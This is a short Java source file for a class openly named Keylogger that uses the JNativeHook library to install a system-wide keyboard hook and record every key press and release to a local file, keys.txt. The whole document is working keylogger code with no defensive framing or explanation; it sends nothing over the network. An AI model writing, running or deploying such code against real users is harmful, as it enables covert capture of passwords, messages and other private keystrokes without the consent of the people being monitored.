import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import java.io.FileWriter;
import java.io.IOException;

public class Keylogger implements NativeKeyListener {
    private static FileWriter writer;

    public static void main(String[] args) {
        try {
            writer = new FileWriter("keys.txt");
        } catch (IOException e) {
            System.err.println("Error creating file writer: " + e.getMessage());
        }

        GlobalScreen.registerNativeHook();

        GlobalScreen.addNativeKeyListener(new Keylogger());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        writeKey(e.getKeyCode(), "Pressed");
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        writeKey(e.getKeyCode(), "Released");
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        // Not used in this example
    }

    private static void writeKey(int keyCode, String status) {
        try {
            writer.write(status + ": " + NativeKeyEvent.getKeyText(keyCode) + "\n");
            writer.flush();
        } catch (IOException e) {
            System.err.println("Error writing key log: " + e.getMessage());
        }
    }
}
